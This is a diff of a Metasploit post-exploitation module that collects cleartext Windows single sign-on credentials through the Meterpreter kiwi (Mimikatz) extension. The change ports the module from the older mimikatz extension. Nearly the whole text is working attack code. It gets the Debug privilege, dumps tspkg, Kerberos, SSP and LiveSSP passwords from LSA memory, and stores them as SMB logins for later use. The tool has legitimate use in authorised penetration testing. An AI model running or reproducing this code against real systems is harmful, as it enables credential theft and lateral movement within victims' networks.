@@ -3,7 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/post/windows/priv'
+require 'set'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Post
       'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
       'Description'  => %q{
         This module will collect cleartext Single Sign On credentials from the Local
-      Security Authority using the Mimikatz extension. Blank passwords will not be stored
+      Security Authority using the Kiwi (Mimikatz) extension. Blank passwords will not be stored
       in the database.
           },
       'License'      => MSF_LICENSE,
@@ -33,14 +33,14 @@ class MetasploitModule < Msf::Post
     print_status("Running module against #{sysinfo['Computer']}")
 
     if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64
-      print_error("x64 platform requires x64 meterpreter and mimikatz extension")
+      print_error("x64 platform requires x64 meterpreter and kiwi extension")
       return
     end
 
-    unless client.mimikatz
-      vprint_status("Loading mimikatz extension...")
+    unless client.kiwi
+      vprint_status("Loading kiwi extension...")
       begin
-        client.core.use("mimikatz")
+        client.core.use("kiwi")
       rescue Errno::ENOENT
         print_error("This module is only available in a windows meterpreter session.")
         return
@@ -49,50 +49,43 @@ class MetasploitModule < Msf::Post
 
     unless is_system?
       vprint_warning("Not running as SYSTEM")
-      debug = client.mimikatz.send_custom_command("privilege::debug")
-      if debug =~ /Not all privileges or groups referenced are assigned to the caller/
+      unless client.kiwi.get_debug_privilege
         print_error("Unable to get Debug privilege")
         return
-      else
-        vprint_status("Retrieved Debug privilege")
+      end
+      vprint_status("Retrieved Debug privilege")
+    end
+
+    vprint_status("Retrieving Credentials")
+    res = client.kiwi.creds_all
+
+    table = Rex::Text::Table.new(
+      'Header'    => "Windows SSO Credentials",
+      'Indent'    => 0,
+      'SortIndex' => 0,
+      'Columns'   => ['Package', 'Domain', 'User', 'Password']
+    )
+
+    processed = Set.new
+    livessp_found = false
+    [:tspkg, :kerberos, :ssp, :livessp].each do |package|
+      next unless res[package]
+      res[package].each do |r|
+        next if is_system_user?(r['Username'])
+        next if r['Username'] == '(null)' && r['Password'] == '(null)'
+        row = [r['Domain'], r['Username'], r['Password']]
+        id = row.join(":")
+        unless processed.include?(id)
+          table << [package.to_s] + row
+          report_creds(*row)
+          processed << id
+        end
+        livessp_found = true if package == :livessp
       end
     end
 
-    vprint_status("Retrieving WDigest")
-    res = client.mimikatz.wdigest
-    vprint_status("Retrieving Tspkg")
-    res.concat client.mimikatz.tspkg
-    vprint_status("Retrieving Kerberos")
-    res.concat client.mimikatz.kerberos
-    vprint_status("Retrieving SSP")
-    res.concat client.mimikatz.ssp
-    vprint_status("Retrieving LiveSSP")
-    livessp = client.mimikatz.livessp
-    unless livessp.first[:password] =~ /livessp KO/
-      res.concat client.mimikatz.livessp
-    else
-      vprint_error("LiveSSP credentials not present")
-    end
-
-    table = Rex::Text::Table.new(
-      'Header' => "Windows SSO Credentials",
-      'Indent' => 0,
-      'SortIndex' => 0,
-      'Columns' =>
-      [
-        'AuthID', 'Package', 'Domain', 'User', 'Password'
-      ]
-    )
-
-    unique_results = res.index_by { |r| "#{r[:authid]}#{r[:user]}#{r[:password]}" }.values
-
-    unique_results.each do |result|
-      next if is_system_user? result[:user]
-      table << [result[:authid], result[:package], result[:domain], result[:user], result[:password]]
-      report_creds(result[:domain], result[:user], result[:password])
-    end
-
-    print_line table.to_s
+    print_line(table.to_s)
+    print_error("No LiveSSP credentials found.\n") unless livessp_found
   end
 
   def report_creds(domain, user, pass)
@@ -101,13 +94,13 @@ class MetasploitModule < Msf::Post
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
-      origin_type: :session,
+      origin_type:         :session,
       post_reference_name: self.refname,
-      private_data: pass,
-      private_type: :password,
-      session_id: session_db_id,
-      username: user,
-      workspace_id: myworkspace_id
+      private_data:        pass,
+      private_type:        :password,
+      session_id:          session_db_id,
+      username:            user,
+      workspace_id:        myworkspace_id
     }
 
     unless domain.blank?
@@ -119,12 +112,12 @@ class MetasploitModule < Msf::Post
 
     # Assemble the options hash for creating the Metasploit::Credential::Login object
     login_data = {
-      core: credential_core,
-      status: Metasploit::Model::Login::Status::UNTRIED,
-      address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
-      port: 445,
+      core:         credential_core,
+      status:       Metasploit::Model::Login::Status::UNTRIED,
+      address:      ::Rex::Socket.getaddress(session.sock.peerhost, true),
+      port:         445,
       service_name: 'smb',
-      protocol: 'tcp',
+      protocol:     'tcp',
       workspace_id: myworkspace_id
     }
 
